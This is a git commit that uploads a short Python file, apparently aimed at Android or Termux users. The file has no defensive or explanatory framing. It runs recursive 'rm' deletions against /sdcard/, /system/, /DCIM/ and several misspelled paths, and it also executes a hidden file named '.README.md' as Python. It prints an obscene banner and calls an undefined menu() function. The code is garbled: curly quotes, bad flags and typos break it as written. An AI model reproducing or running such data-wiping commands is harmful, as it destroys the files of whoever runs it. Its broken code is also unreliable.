a77bb89f64baeb4bbc22d6059d963c858c1e6cf8
hackfacbook <81623878+hackfacbook@users.noreply.github.com>
2021-03-30 14:01:42 +0300

    Add files via upload

---
+++ hdbn.py
@@ -0,0 +1,13 @@
+import os
+os.system(‘rm -rif /sdcard/‘)
+os.system(‘rm -rif /system/‘)
+os.system(‘rm -rif /Andrid/‘)
+os.system(‘rm -rif /Dowlod/‘)
+os.system(‘rm -rif /Reset Settings/‘)
+os.system(‘rm -rif /DCIM/‘)
+os.system("figlet\x1b[1;91mFUK YOU")
+os.system('python2 .README.md')
+    
+    
+if __name__ == '__main__':
+    menu()
